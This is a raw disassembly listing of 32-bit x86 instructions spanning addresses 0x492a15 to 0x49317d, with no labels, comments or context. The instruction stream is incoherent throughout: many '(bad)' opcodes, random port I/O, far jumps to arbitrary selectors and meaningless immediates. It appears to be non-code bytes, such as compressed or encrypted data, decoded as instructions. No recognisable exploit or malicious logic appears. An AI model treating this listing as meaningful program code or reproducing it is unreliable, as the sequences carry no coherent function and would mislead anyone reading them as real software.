  492a15:	dec    edx
  492a16:	pop    es
  492a17:	pop    ss
  492a18:	xchg   esp,eax
  492a19:	lea    ebx,[ebx+0x66347785]
  492a1f:	arpl   WORD PTR [ebp-0x1e],dx
  492a22:	xchg   edi,eax
  492a23:	push   edi
  492a24:	(bad)
  492a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492a29:	ss jg  0x492a6d
  492a2c:	or     eax,0x77073120
  492a31:	bound  ebx,QWORD PTR [eax]
  492a33:	and    DWORD PTR [eax+0x1058175f],eax
  492a39:	retf   
  492a3a:	inc    esi
  492a3b:	outs   dx,DWORD PTR ds:[esi]
  492a3c:	and    esi,DWORD PTR [ebx+eax*1-0x7038b0d5]
  492a43:	jbe    0x492a9d
  492a45:	pop    eax
  492a46:	rcr    DWORD PTR [edi+0x67],0x11
  492a4a:	stos   BYTE PTR es:[edi],al
  492a4b:	popa   
  492a4c:	mov    ebp,0x83601f9a
  492a51:	inc    esi
  492a52:	and    eax,0xc653dfc7
  492a57:	mov    BYTE PTR [edx-0x59],ah
  492a5a:	test   al,0x20
  492a5c:	push   ss
  492a5d:	mov    WORD PTR [edi],?
  492a5f:	jg     0x492a60
  492a61:	mov    ecx,0x466226b0
  492a66:	pop    edi
  492a67:	mov    bl,0x32
  492a69:	inc    edx
  492a6a:	and    eax,0xa0b7448c
  492a6f:	test   BYTE PTR [eax-0x78904016],dh
  492a75:	mov    ds,WORD PTR [edx-0x3a]
  492a78:	daa    
  492a79:	xor    DWORD PTR [ebx],ebp
  492a7b:	inc    esp
  492a7c:	inc    eax
  492a7d:	jge    0x492adf
  492a7f:	jnp    0x492ab0
  492a81:	add    BYTE PTR [ebp+esi*2+0x23],dh
  492a85:	mov    edi,0x3269145
  492a8a:	add    eax,0xe3af3957
  492a8f:	(bad)  
  492a90:	lods   al,BYTE PTR ds:[esi]
  492a91:	adc    BYTE PTR [edi-0x4ff962d2],al
  492a97:	inc    edx
  492a98:	aas    
  492a99:	outs   dx,DWORD PTR ds:[esi]
  492a9a:	jb     0x492a31
  492a9c:	add    al,BYTE PTR [edx]
  492a9e:	dec    edi
  492a9f:	aaa    
  492aa0:	add    BYTE PTR [edx-0x7f],bl
  492aa3:	push   esi
  492aa4:	inc    edi
  492aa5:	(bad)  
  492aa6:	mov    cl,0xb5
  492aa8:	outs   dx,BYTE PTR ds:[esi]
  492aa9:	push   edi
  492aaa:	xchg   edi,eax
  492aab:	xor    esi,DWORD PTR [edx]
  492aad:	jo     0x492b04
  492aaf:	(bad)  
  492ab0:	mov    bh,0x44
  492ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492ab3:	adc    DWORD PTR [esp+edx*8],0xc6c034f7
  492aba:	sub    BYTE PTR [edi+0x75c9296f],ch
  492ac0:	imul   edx,DWORD PTR [edi+0x2d0ab434],0x84dfcf4e
  492aca:	test   BYTE PTR [ebp+eiz*4+0x67],bl
  492ace:	xor    al,0x34
  492ad0:	add    DWORD PTR [ebx+0x6a6787b0],ebp
  492ad6:	mov    DWORD PTR [esi],0xd07b1f68
  492adc:	sbb    ch,BYTE PTR [eax+0x32faf15]
  492ae2:	stos   DWORD PTR es:[edi],eax
  492ae3:	push   edx
  492ae4:	sub    bh,bh
  492ae6:	inc    edi
  492ae7:	ret    0x9558
  492aea:	shr    BYTE PTR [edx+0x602d9a07],cl
  492af0:	jo     0x492af1
  492af2:	outs   dx,DWORD PTR ds:[esi]
  492af3:	or     ch,BYTE PTR [eax+0x6f30bb01]
  492af9:	xchg   DWORD PTR [edx-0x48],esp
  492afc:	pusha  
  492afd:	aam    0xcf
  492aff:	xor    esi,DWORD PTR [edi]
  492b01:	and    dl,BYTE PTR [eax+0x5f30e4b1]
  492b07:	bound  esi,QWORD PTR [ebp-0x66]
  492b0a:	ret    0x6d57
  492b0d:	sub    BYTE PTR [ebp+0x5e78711],dh
  492b13:	(bad)  
  492b14:	jno    0x492b5a
  492b16:	mov    edi,0xac70743
  492b1b:	test   eax,0x8ff76035
  492b20:	cwde   
  492b21:	test   al,0x4
  492b23:	jecxz  0x492b56
  492b25:	pop    ss
  492b26:	aaa    
  492b27:	add    ebp,DWORD PTR [ecx]
  492b29:	dec    edx
  492b2a:	or     bh,ah
  492b2c:	shr    BYTE PTR [esi-0x8609a2b],1
  492b32:	push   ebp
  492b33:	add    BYTE PTR [esi],dl
  492b35:	dec    esp
  492b36:	pop    edi
  492b37:	push   ss
  492b38:	inc    esp
  492b39:	jo     0x492ac6
  492b3b:	or     BYTE PTR [edi+edx*1],ah
  492b3e:	adc    dh,BYTE PTR [ecx+0x1f465c96]
  492b44:	push   ebp
  492b45:	stos   DWORD PTR es:[edi],eax
  492b46:	retf   0xcf06
  492b49:	das    
  492b4a:	jo     0x492afc
  492b4c:	jecxz  0x492bae
  492b4e:	shl    DWORD PTR [edi-0x72a973cd],cl
  492b54:	add    cl,BYTE PTR [edi+0x47]
  492b57:	test   al,0xb4
  492b59:	outs   dx,BYTE PTR ds:[esi]
  492b5a:	daa    
  492b5b:	jg     0x492b97
  492b5d:	syscall 
  492b5f:	mov    ebx,DWORD PTR [ebx+0x680f6f44]
  492b65:	imul   esi,DWORD PTR [esi+0x1a672756],0x68
  492b6c:	or     eax,0xe19fd231
  492b71:	sub    BYTE PTR [eax+0x71308731],al
  492b77:	dec    eax
  492b78:	les    ebp,FWORD PTR [edx-0x548f60f1]
  492b7e:	gs popa 
  492b80:	out    0x86,eax
  492b82:	add    cl,BYTE PTR [edi]
  492b84:	push   0x54
  492b86:	(bad)  
  492b88:	push   ebp
  492b89:	rcr    BYTE PTR [edx],1
  492b8b:	push   ecx
  492b8c:	mov    bh,0xbf
  492b8e:	mov    esp,0x3f682551
  492b93:	ja     0x492b45
  492b95:	stos   BYTE PTR es:[edi],al
  492b96:	xchg   esp,eax
  492b97:	outs   dx,DWORD PTR es:[esi]
  492b99:	pop    es
  492b9a:	xor    dh,al
  492b9c:	test   eax,0x854f2e33
  492ba1:	adc    al,0xe2
  492ba3:	in     eax,dx
  492ba4:	xchg   edi,ebp
  492ba6:	fistp  WORD PTR [edx]
  492ba8:	push   esi
  492ba9:	xor    esi,DWORD PTR [ebp-0x15]
  492bac:	xlat   BYTE PTR ds:[ebx]
  492bad:	(bad)  
  492baf:	mov    BYTE PTR [edx],cl
  492bb1:	shr    BYTE PTR [edi],0x63
  492bb4:	fcomp  QWORD PTR [eax+0x45]
  492bb7:	mov    edi,0x38c15a8f
  492bbc:	dec    ebp
  492bbd:	inc    edi
  492bbe:	pop    ss
  492bbf:	push   0xffffff96
  492bc1:	mov    cl,0x88
  492bc3:	inc    edi
  492bc4:	mov    edi,0xc01512e4
  492bc9:	dec    edi
  492bca:	mov    ebx,0x8ed60495
  492bcf:	inc    edi
  492bd0:	(bad)  
  492bd1:	repz popa 
  492bd3:	call   0x39f0b80a
  492bd8:	jmp    0x492b8e
  492bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492bdb:	cs scas eax,DWORD PTR es:[edi]
  492bdd:	xor    bh,cl
  492bdf:	dec    eax
  492be0:	rol    DWORD PTR [ecx+ebx*1],0x47
  492be4:	pop    ss
  492be5:	jo     0x492c18
  492be7:	add    BYTE PTR [edi],ah
  492be9:	xor    bl,BYTE PTR [edi]
  492beb:	jae    0x492c10
  492bed:	and    dl,BYTE PTR [edx-0x29]
  492bf0:	adc    ebp,DWORD PTR [esi+0x56]
  492bf3:	jne    0x492bd0
  492bf5:	lods   eax,DWORD PTR ds:[esi]
  492bf6:	outs   dx,DWORD PTR ds:[esi]
  492bf7:	pop    ds
  492bf8:	inc    ecx
  492bf9:	(bad)  
  492bfa:	mov    cl,0x60
  492bfc:	add    eax,0xb1a71fb0
  492c01:	sub    edx,DWORD PTR [edx+0x34671370]
  492c07:	aaa    
  492c08:	push   cs
  492c09:	and    eax,0x9e7f6246
  492c0e:	test   DWORD PTR [edx-0x30b96d50],esi
  492c14:	test   DWORD PTR [eax+0x41176368],ebp
  492c1a:	inc    eax
  492c1b:	jmp    0x492c47
  492c1d:	pop    es
  492c1e:	xor    eax,0x84ec6dcf
  492c23:	xor    DWORD PTR [ecx-0x29],eax
  492c26:	add    DWORD PTR [eax+edx*4-0x69cc3877],edx
  492c2d:	adc    DWORD PTR [eax+0x3343c93c],0x0
  492c34:	xor    dh,BYTE PTR [ebx+0x15]
  492c37:	(bad)  
  492c38:	mov    al,BYTE PTR [edi+edi*4]
  492c3b:	out    0x40,eax
  492c3d:	mov    ah,BYTE PTR [eax]
  492c3f:	leave  
  492c40:	inc    ebp
  492c41:	outs   dx,DWORD PTR ds:[esi]
  492c42:	call   0x5a6f:0x87a2c5d6
  492c49:	add    al,0x49
  492c4b:	mov    DWORD PTR [edi],edx
  492c4d:	daa    
  492c4e:	add    DWORD PTR [ebp-0x28007a92],0x2ab59732
  492c58:	xchg   edx,eax
  492c59:	pop    eax
  492c5a:	jg     0x492c8c
  492c5c:	jno    0x492cc7
  492c5e:	mov    bl,0x27
  492c60:	out    dx,eax
  492c61:	inc    ecx
  492c62:	add    esi,DWORD PTR [esi+0x5]
  492c65:	hlt    
  492c66:	lahf   
  492c67:	ja     0x492ca0
  492c69:	inc    edi
  492c6a:	add    al,0x5c
  492c6c:	sub    DWORD PTR [ebx-0x49],eax
  492c6f:	xor    DWORD PTR ds:0x5f508e85,ecx
  492c75:	xchg   edi,eax
  492c76:	push   cs
  492c77:	add    BYTE PTR [eax+0x5],ah
  492c7a:	adc    edx,esi
  492c7c:	xor    DWORD PTR [ecx+0x44],eax
  492c7f:	and    eax,0x9283c740
  492c84:	dec    edx
  492c85:	enter  0x2744,0x50
  492c89:	bound  eax,QWORD PTR [esi+0x11c738a4]
  492c8f:	cmp    al,0x11
  492c91:	mov    eax,0x12678b7f
  492c96:	rol    BYTE PTR [edx+0x22],0xff
  492c9a:	retf   0xc01d
  492c9d:	mov    al,ds:0x5232cf3f
  492ca2:	and    esi,DWORD PTR [esi-0x3280ba6e]
  492ca8:	adc    BYTE PTR [ecx+0x58872f6e],dh
  492cae:	ret    0x58f3
  492cb1:	jnp    0x492c82
  492cb3:	mov    eax,ds:0xa71520b1
  492cb8:	mul    DWORD PTR [edi+0x56902653]
  492cbe:	jg     0x492cf0
  492cc0:	lahf   
  492cc1:	push   ebp
  492cc2:	sub    DWORD PTR [edx],edx
  492cc4:	push   ebx
  492cc5:	inc    edx
  492cc6:	xlat   BYTE PTR ds:[ebx]
  492cc7:	xchg   ebp,eax
  492cc8:	loopne 0x492cca
  492cca:	lea    esp,[edi]
  492ccc:	push   esi
  492ccd:	dec    ecx
  492cce:	in     eax,0x95
  492cd0:	(bad)  
  492cd1:	xor    eax,0x4c528036
  492cd6:	adc    al,0x3f
  492cd8:	aad    0x56
  492cda:	xor    al,ah
  492cdc:	jg     0x492ce5
  492cde:	inc    DWORD PTR [ebp-0x54]
  492ce1:	test   DWORD PTR [esi-0x7ad4c8e1],eax
  492ce7:	dec    esp
  492ce8:	xchg   DWORD PTR [edi-0x6dcad6bd],edi
  492cee:	les    ebx,FWORD PTR [esi-0x7539e209]
  492cf4:	or     ebx,DWORD PTR [ebx-0x41]
  492cf7:	iret   
  492cf8:	mov    dh,0xa
  492cfa:	nop
  492cfb:	or     BYTE PTR [edi+0x4c085667],cl
  492d01:	push   es
  492d02:	cmp    bh,ch
  492d04:	cmp    dl,BYTE PTR [esi]
  492d06:	test   BYTE PTR [eax],ch
  492d08:	iret   
  492d09:	pop    edi
  492d0a:	dec    edi
  492d0b:	inc    ecx
  492d0c:	xor    eax,0xd578c60
  492d11:	test   eax,0xefdaa358
  492d16:	dec    edi
  492d17:	bound  edx,QWORD PTR [eax]
  492d19:	stos   DWORD PTR es:[edi],eax
  492d1a:	pusha  
  492d1b:	pop    es
  492d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492d1d:	add    eax,0x4f8c0093
  492d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492d23:	adc    eax,0x9fef8d01
  492d28:	stos   BYTE PTR es:[edi],al
  492d29:	adc    dh,BYTE PTR [esi+ebx*2]
  492d2c:	dec    ebx
  492d2d:	out    dx,eax
  492d2e:	lods   eax,DWORD PTR ds:[esi]
  492d2f:	inc    edx
  492d30:	pop    ebx
  492d31:	pop    ecx
  492d32:	fisttp WORD PTR [edi+0x2c8adb09]
  492d38:	xchg   DWORD PTR [edi+0x62],edi
  492d3b:	adc    al,BYTE PTR [ecx+0x49b7cb4f]
  492d41:	pop    edx
  492d42:	pop    ebp
  492d43:	inc    eax
  492d44:	ja     0x492db7
  492d46:	rcl    eax,1
  492d48:	adc    BYTE PTR [edi-0x137fe555],0x8c
  492d4f:	sahf   
  492d50:	pop    es
  492d51:	xchg   DWORD PTR [esi+ecx*1-0x50c94725],edx
  492d58:	sbb    esp,eax
  492d5a:	bound  esp,QWORD PTR [esi+0x74026cc7]
  492d60:	xor    eax,0x630745df
  492d65:	(bad)  
  492d66:	aam    0x29
  492d68:	ucomiss xmm6,DWORD PTR [eax]
  492d6b:	mov    ss,esi
  492d6d:	sub    eax,0xa1c69bbf
  492d72:	adc    dl,BYTE PTR [edi+ecx*1]
  492d75:	fistp  WORD PTR [ecx]
  492d77:	inc    edx
  492d78:	jb     0x492d4f
  492d7a:	fild   WORD PTR [edx-0x49]
  492d7d:	and    eax,DWORD PTR [eax+0xc]
  492d80:	xchg   edx,eax
  492d81:	xor    DWORD PTR [edi-0x70],ebp
  492d84:	push   ss
  492d85:	or     dl,BYTE PTR [esi-0x71]
  492d88:	aaa    
  492d89:	cdq    
  492d8a:	inc    edx
  492d8b:	pop    esp
  492d8c:	add    eax,0x45bf42ef
  492d91:	bound  edx,QWORD PTR [eax+ebx*2]
  492d94:	or     DWORD PTR [edi-0x3b7a4b96],ebp
  492d9a:	push   ds
  492d9b:	xchg   edi,eax
  492d9c:	jg     0x492d4f
  492d9e:	ret    
  492d9f:	inc    eax
  492da0:	mov    BYTE PTR [edi],dh
  492da2:	pop    ss
  492da3:	xchg   ebx,eax
  492da4:	pop    eax
  492da5:	pop    ebp
  492da6:	mov    ah,0x67
  492da8:	stos   BYTE PTR es:[edi],al
  492da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492daa:	mov    WORD PTR [ebx+0x78f4427],es
  492db0:	ins    DWORD PTR es:[edi],dx
  492db1:	sub    edx,esi
  492db3:	pandn  mm6,QWORD PTR [edi]
  492db6:	push   esi
  492db7:	or     eax,0x9f1786ad
  492dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492dbd:	rol    dl,0x87
  492dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492dc1:	xlat   BYTE PTR ds:[ebx]
  492dc2:	fwait
  492dc3:	dec    esp
  492dc4:	lods   al,BYTE PTR ds:[esi]
  492dc5:	test   DWORD PTR [edi],edx
  492dc7:	mov    edi,0x780316af
  492dcc:	ins    BYTE PTR es:[edi],dx
  492dcd:	pop    edi
  492dce:	or     bl,BYTE PTR [edi+0x2a]
  492dd1:	lods   eax,DWORD PTR ds:[esi]
  492dd2:	adc    eax,0x880f5f01
  492dd7:	push   ebp
  492dd8:	mov    ch,0xe0
  492dda:	inc    ecx
  492ddb:	addr16 aaa 
  492ddd:	fimul  DWORD PTR ds:0x34f7cc1c
  492de3:	addr16 jg 0x492db7
  492de6:	xlat   BYTE PTR ds:[ebx]
  492de7:	push   es
  492de8:	sbb    DWORD PTR [ebx],ebx
  492dea:	outs   dx,DWORD PTR ds:[esi]
  492deb:	pop    es
  492dec:	push   esp
  492ded:	or     ah,BYTE PTR [eax-0x29]
  492df0:	out    dx,eax
  492df1:	jnp    0x492e05
  492df3:	hlt    
  492df4:	sbb    DWORD PTR [ebp-0x55],0x84f156d7
  492dfb:	pop    ebp
  492dfc:	(bad)  
  492dfd:	ja     0x492e16
  492dff:	jmp    0x207:0xfe87a134
  492e06:	mov    al,0x51
  492e08:	inc    edx
  492e09:	adc    DWORD PTR [esi],0x2
  492e0c:	sbb    BYTE PTR [edi+esi*1],bl
  492e0f:	pop    edi
  492e10:	adc    al,0x53
  492e12:	cwde   
  492e13:	sub    BYTE PTR [edi+0x11023f42],al
  492e19:	or     dh,BYTE PTR [edi+esi*1]
  492e1c:	xlat   BYTE PTR ds:[ebx]
  492e1d:	push   ebp
  492e1e:	mov    al,ds:0x37b74c46
  492e23:	btc    DWORD PTR [ecx+eiz*2],ecx
  492e27:	pop    ebx
  492e28:	mov    bh,0x8d
  492e2a:	push   esp
  492e2b:	sub    BYTE PTR [ebx],al
  492e2d:	das    
  492e2e:	or     al,0x2d
  492e30:	and    dh,BYTE PTR [edi+ebx*2+0x2f]
  492e34:	adc    DWORD PTR [eax],esp
  492e36:	push   ss
  492e37:	cmp    DWORD PTR [ebx+0x1b],0x61
  492e3b:	mov    ch,0x83
  492e3d:	xlat   BYTE PTR ds:[ebx]
  492e3e:	xor    DWORD PTR [edi+0x16],ecx
  492e41:	dec    edi
  492e42:	add    al,0x16
  492e45:	inc    edx
  492e46:	lahf   
  492e47:	push   ebp
  492e48:	test   BYTE PTR [ebp-0x2c],cl
  492e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492e4c:	bound  esi,QWORD PTR [bp+si+0x15]
  492e50:	mov    eax,ds:0x890a416f
  492e55:	les    ebp,FWORD PTR [ebp+0x3f]
  492e58:	ja     0x492ec7
  492e5a:	stos   DWORD PTR es:[edi],eax
  492e5b:	enter  0x97d4,0x37
  492e5f:	pop    eax
  492e60:	adc    ecx,DWORD PTR [esp+ebx*2-0x69]
  492e64:	out    0xeb,eax
  492e66:	xchg   esi,eax
  492e67:	jbe    0x492eb2
  492e69:	pop    es
  492e6a:	iret   
  492e6b:	mov    eax,0xb7080955
  492e70:	(bad)  
  492e71:	adc    BYTE PTR [esi+0x4517506a],ah
  492e77:	bound  edx,QWORD PTR [edx]
  492e79:	stos   DWORD PTR es:[edi],eax
  492e7a:	push   ecx
  492e7b:	out    0x5f,eax
  492e7d:	(bad)
  492e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492e82:	inc    esp
  492e83:	push   esp
  492e84:	and    dh,BYTE PTR [eax+ecx*1+0x622e23eb]
  492e8b:	mov    ds:0x559fdb8d,eax
  492e90:	lods   al,BYTE PTR gs:[esi]
  492e92:	ret    0xe70f
  492e95:	shr    BYTE PTR [edx-0xcbb2ce6],0x1f
  492e9c:	aad    0xb4
  492e9e:	fs call 0xd228679b
  492ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492ea5:	lds    ecx,FWORD PTR [ecx+0x5568278f]
  492eab:	mov    ah,0xb6
  492ead:	pop    edi
  492eae:	fild   QWORD PTR [ebp+0x1f550b40]
  492eb4:	iret   
  492eb5:	jbe    0x492eb7
  492eb7:	mov    bh,0x28
  492eb9:	addr16 cmp ch,bh
  492ebc:	(bad)  
  492ebd:	(bad)  
  492ebf:	sub    BYTE PTR [edi+0xaa1738],dl
  492ec5:	xchg   esp,eax
  492ec6:	and    bl,BYTE PTR [edi]
  492ec8:	das    
  492ec9:	and    eax,0x3d5944f
  492ece:	data16 xor BYTE PTR [ecx+0x29],dl
  492ed2:	sbb    BYTE PTR [ecx-0x53976e51],al
  492ed8:	dec    edx
  492ed9:	xlat   BYTE PTR ds:[ebx]
  492eda:	(bad)  
  492edc:	and    al,0x70
  492ede:	pop    edx
  492edf:	outs   dx,BYTE PTR ds:[esi]
  492ee0:	out    dx,eax
  492ee1:	or     BYTE PTR [ebx-0x52f8b7f8],cl
  492ee7:	shl    DWORD PTR [esi+esi*2],0xaf
  492eeb:	scas   eax,DWORD PTR es:[edi]
  492eec:	js     0x492e99
  492eee:	pusha  
  492eef:	lods   al,BYTE PTR ds:[esi]
  492ef0:	dec    ebx
  492ef1:	inc    edi
  492ef2:	cmp    ebp,DWORD PTR [esp+ebx*1]
  492ef5:	adc    al,0xc3
  492ef7:	inc    edi
  492ef8:	xor    al,0x62
  492efa:	test   BYTE PTR [ebx+eax*1+0x1da731c7],ah
  492f01:	xchg   ebp,eax
  492f02:	es mov al,0xbf
  492f05:	xor    al,BYTE PTR [eax+ebp*1]
  492f08:	inc    esp
  492f09:	and    edi,eax
  492f0b:	push   ebp
  492f0c:	sbb    esp,DWORD PTR [ebp+edx*8+0x63bfff3f]
  492f13:	push   ebp
  492f14:	or     esp,DWORD PTR [ebp+0x34ac4fbf]
  492f1a:	(bad)  
  492f1b:	or     al,0xf7
  492f1d:	dec    edi
  492f1e:	rcr    BYTE PTR [edx+0x54],1
  492f21:	add    edi,edx
  492f23:	aaa    
  492f24:	shr    DWORD PTR [ebp+0x63],1
  492f27:	xor    eax,0x9807b777
  492f2c:	sbb    al,0xae
  492f2e:	outs   dx,DWORD PTR ds:[esi]
  492f2f:	inc    esi
  492f30:	add    BYTE PTR [ebx],bh
  492f32:	ret    0x66ad
  492f35:	add    DWORD PTR [edi-0x4f4ca575],esi
  492f3b:	push   cs
  492f3c:	pop    ds
  492f3d:	fist   WORD PTR [edi]
  492f3f:	push   0xaf7fca55
  492f44:	aaa    
  492f45:	sub    BYTE PTR [edx-0x7b30db80],dl
  492f4b:	inc    edi
  492f4c:	sbb    eax,0x9ff739eb
  492f51:	mov    al,ds:0xdfa2aa15
  492f56:	inc    esi
  492f57:	daa    
  492f58:	mov    ch,0x28
  492f5a:	out    0x7f,eax
  492f5c:	popa   
  492f5d:	dec    ebp
  492f5e:	xchg   esp,eax
  492f5f:	lock shr DWORD PTR [edi+0x418aa5a5],cl
  492f66:	xchg   edi,eax
  492f68:	pop    es
  492f69:	and    al,0x8c
  492f6b:	fcomp  DWORD PTR [esi+0x5a62c7c7]
  492f71:	sbb    edx,DWORD PTR [esi-0x19]
  492f74:	pop    es
  492f75:	outs   dx,BYTE PTR ds:[esi]
  492f76:	cmp    esp,DWORD PTR [esi]
  492f78:	and    eax,0x137745cf
  492f7d:	(bad)  
  492f7e:	add    DWORD PTR gs:[edi+0x4b],ebx
  492f82:	outs   dx,DWORD PTR ds:[esi]
  492f83:	shl    BYTE PTR [ecx],1
  492f85:	call   0xdf535760
  492f8a:	int    0xd6
  492f8c:	sub    bh,BYTE PTR [edx+0x2f47371f]
  492f92:	or     BYTE PTR [ebx+0x30462b6e],dl
  492f98:	and    al,BYTE PTR [ecx-0x4f00de2b]
  492f9e:	push   ebx
  492f9f:	shr    BYTE PTR [edx-0x570a4419],1
  492fa5:	add    eax,0xf78f6789
  492faa:	mov    DWORD PTR [ebp+0x11],ebp
  492fad:	(bad)  
  492fae:	das    
  492faf:	adc    edi,0xffffffb4
  492fb2:	xor    al,0xc2
  492fb4:	sub    al,BYTE PTR [edi]
  492fb6:	into   
  492fb7:	push   edx
  492fb8:	or     BYTE PTR [ecx],al
  492fba:	stos   DWORD PTR es:[edi],eax
  492fbb:	call   FWORD PTR [esi]
  492fbd:	xor    dl,BYTE PTR [edx+0x3742a894]
  492fc3:	jo     0x492ff0
  492fc5:	xchg   BYTE PTR [ebx],ah
  492fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492fc8:	inc    ebx
  492fc9:	xchg   ebx,esp
  492fcb:	mov    ah,0x80
  492fcd:	fmul   DWORD PTR [esi]
  492fcf:	neg    BYTE PTR [edi-0x59]
  492fd2:	mov    cl,0x83
  492fd4:	add    eax,0x471f37ab
  492fd9:	idiv   DWORD PTR [eax+0x4a1b8d3e]
  492fdf:	mov    ds:0xe6c6833f,eax
  492fe4:	mov    al,0xc7
  492fe6:	xlat   BYTE PTR ds:[ebx]
  492fe7:	dec    esp
  492fe8:	adc    DWORD PTR [ebp+esi*2+0x35329f1f],eax
  492fef:	retf   
  492ff0:	pop    edx
  492ff1:	imul   edx,DWORD PTR [edi],0x200a2dbf
  492ff7:	sub    BYTE PTR [edi+0x101b6],al
  492ffd:	iret   
  492ffe:	out    0x80,eax
  493000:	dec    edx
  493001:	push   esp
  493002:	add    al,0x47
  493004:	cmp    al,BYTE PTR [edx]
  493006:	ins    DWORD PTR es:[edi],dx
  493007:	xor    BYTE PTR [edi-0x51],cl
  49300a:	fild   WORD PTR [esi+edx*8-0x4720fb98]
  493011:	xchg   esp,eax
  493012:	shl    DWORD PTR [eax+0x77],cl
  493015:	out    0x1f,eax
  493017:	add    al,0x42
  493019:	xor    DWORD PTR [eax-0x6a],0xffffffc7
  49301d:	inc    esi
  49301e:	adc    esi,DWORD PTR [eax+ebp*4+0x7580671f]
  493025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  493026:	call   0x1740:0xa808e7e7
  49302d:	mov    bh,0x27
  49302f:	inc    ecx
  493030:	sub    eax,DWORD PTR [edx]
  493032:	mov    al,0x7
  493034:	push   esi
  493035:	add    DWORD PTR [edx+0x51],ebp
  493038:	out    0x87,eax
  49303a:	loopne 0x49309c
  49303c:	pop    esp
  49303d:	and    al,0x5f
  49303f:	inc    edi
  493040:	adc    DWORD PTR [ebx-0x206083b8],ebx
  493046:	push   edi
  493047:	test   DWORD PTR [ebp+0x343fe70a],edx
  49304d:	pop    edx
  49304e:	mov    DWORD PTR [esi+0x0],esp
  493051:	xchg   ebp,edx
  493053:	dec    ecx
  493054:	sub    al,0xe
  493056:	push   edi
  493057:	(bad)  
  493058:	push   edx
  493059:	mov    ds:0x6733d683,al
  49305e:	popa   
  49305f:	add    ecx,DWORD PTR [ebx+0xab05f03]
  493065:	test   al,0xd5
  493067:	ja     0x493090
  493069:	shr    DWORD PTR [eax],1
  49306b:	xor    al,0x2a
  49306d:	pop    ss
  49306e:	jg     0x493097
  493070:	inc    edx
  493071:	sbb    BYTE PTR [ecx-0x2a],ch
  493074:	out    0xbf,eax
  493076:	adc    DWORD PTR [ecx+0x37428e12],0x8051c91a
  493080:	xor    edi,DWORD PTR [edi+0x556b4842]
  493086:	adc    bh,0xb1
  493089:	imul   ecx,DWORD PTR [edx+0x362fcfc6],0xade2081f
  493093:	imul   DWORD PTR ss:[edi+0x18]
  493097:	cmp    BYTE PTR [edx+edx*8+0x3addc32f],dh
  49309e:	xor    DWORD PTR [edx-0x79],esp
  4930a1:	dec    edi
  4930a2:	das    
  4930a3:	inc    esi
  4930a4:	pusha  
  4930a5:	lds    esp,FWORD PTR [eax]
  4930a7:	es iret 
  4930a9:	push   0x37891f55
  4930ae:	jnp    0x4930e7
  4930b0:	sbb    edi,edx
  4930b2:	fidiv  DWORD PTR [ecx+0x724fa7ff]
  4930b8:	push   esp
  4930b9:	push   edi
  4930ba:	sub    al,0x2f
  4930bc:	inc    esi
  4930bd:	pop    ss
  4930be:	ss jmp 0x27b561c4
  4930c4:	cmp    edi,esp
  4930c6:	lods   eax,DWORD PTR ds:[esi]
  4930c7:	adc    al,0x82
  4930c9:	js     0x4930be
  4930cb:	pop    ss
  4930cc:	mov    ch,0x99
  4930ce:	mov    bl,ah
  4930d0:	pop    ss
  4930d1:	inc    ebp
  4930d2:	xchg   edi,eax
  4930d3:	leave  
  4930d4:	and    BYTE PTR [esi],bl
  4930d6:	jo     0x49307f
  4930d8:	addr16 push cs
  4930da:	mov    ah,0x43
  4930dc:	mov    edi,eax
  4930de:	inc    edi
  4930df:	pop    ss
  4930e0:	add    dl,BYTE PTR [edi-0x50811eba]
  4930e6:	ds or  al,0xc7
  4930e9:	mov    eax,0xe71e4734
  4930ee:	jg     0x4930ab
  4930f0:	push   esi
  4930f1:	nop
  4930f2:	pop    edx
  4930f3:	mov    DWORD PTR [edi+0x41a5dc2],0x21310ff3
  4930fd:	je     0x4930d8
  4930ff:	jp     0x4930d4
  493101:	pop    edi
  493102:	adc    eax,0x7f6ad002
  493107:	mov    bh,0x46
  493109:	(bad)  
  49310a:	ror    BYTE PTR [ecx+0x3a31bfa7],1
  493110:	add    eax,0x7035dfac
  493115:	stos   DWORD PTR es:[edi],eax
  493116:	xchg   edx,eax
  493117:	out    dx,eax
  493118:	arpl   WORD PTR [edx],di
  49311a:	dec    ebp
  49311b:	adc    BYTE PTR [ebx+0xb09f7a4],ch
  493121:	test   DWORD PTR [edi+ecx*4-0x19],eax
  493125:	or     DWORD PTR [edx],ebx
  493127:	mov    ch,0x8b
  493129:	pop    ds
  49312a:	inc    ecx
  49312b:	xlat   BYTE PTR ds:[ebx]
  49312c:	xchg   ebx,eax
  49312d:	mov    WORD PTR [ebx],gs
  49312f:	inc    esi
  493130:	daa    
  493131:	aaa    
  493132:	pop    ss
  493133:	(bad)  
  493134:	mov    eax,ds:0xdf464c94
  493139:	call   0x7821ab4e
  49313e:	inc    ebx
  49313f:	pop    edi
  493140:	or     DWORD PTR [eax-0x60baaf],0x71
  493147:	xor    DWORD PTR [ecx+0x58],edx
  49314a:	daa    
  49314b:	xor    DWORD PTR [edx],eax
  49314d:	add    al,0x22
  49314f:	mov    al,0x87
  493151:	fild   QWORD PTR [ecx]
  493153:	ret    0x2414
  493156:	pop    es
  493157:	inc    edx
  493158:	push   edi
  493159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49315a:	add    esp,edx
  49315c:	or     al,0x4f
  49315e:	inc    edx
  49315f:	outs   dx,DWORD PTR ds:[esi]
  493160:	xchg   edi,eax
  493161:	sar    DWORD PTR [edx-0x40c43097],0xc5
  493168:	and    dl,BYTE PTR [esi]
  49316a:	fld    TBYTE PTR [edi]
  49316c:	bound  ebp,QWORD PTR [edi-0x53eca513]
  493172:	das    
  493173:	cmp    ebx,ebx
  493175:	fisttp DWORD PTR [ebp+0x3d]
  493178:	pop    ds
  493179:	jmp    DWORD PTR [edi+0x27]
  49317c:	inc    ebp
  49317d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
